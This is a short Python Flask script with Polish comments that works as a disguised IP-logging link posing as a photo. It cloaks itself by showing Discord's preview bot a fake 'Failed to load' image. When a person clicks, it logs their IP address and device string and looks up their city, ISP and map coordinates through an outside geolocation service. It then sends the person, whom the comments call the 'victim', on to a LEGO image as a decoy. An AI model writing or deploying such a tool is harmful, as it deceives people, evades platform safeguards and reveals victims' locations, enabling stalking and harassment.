from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# --- KONFIGURACJA ---
# Zdjęcie "Failed to load" z Reddita (bezpośredni link do grafiki)
ERROR_IMG = "https://preview.redd.it/failed-to-load-image-on-mobile-v0-v9v846fbt01a1.png?width=1080&format=png&auto=webp&s=5568f1857948270139b8f2f458e0a3f6a27e029c"
# Prawdziwe zdjęcie LEGO dla ofiary
REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"

@app.route('/photo')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # 1. CLOAKING: Bot Discorda dostaje "Failed to load"
    if "Discordbot" in ua or "externalhit" in ua.lower():
        print(f"--- BOT DISCORDA SPRAWDZA LINK ---")
        return redirect(ERROR_IMG)

    # 2. LOGOWANIE DO KONSOLI RENDERA (Twoje IP i Lokalizacja)
    print(f"\n[!!!] KTOŚ KLIKNĄŁ W LINK [!!!]")
    print(f"IP: {ip}")
    
    try:
        # Pobieramy dane o lokalizacji
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon", timeout=5).json()
        if r.get("status") == "success":
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('regionName')}, {r.get('country')}")
            print(f"ISP: {r.get('isp')}")
            print(f"MAPA: https://www.google.com/maps?q={r.get('lat')},{r.get('lon')}")
    except Exception as e:
        print(f"Błąd lokalizacji: {e}")

    print(f"DEVICE: {ua}")
    print(f"-----------------------------------\n")

    # 3. PRZEKIEROWANIE: Ofiara ląduje na zdjęciu LEGO
    return redirect(REAL_IMG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
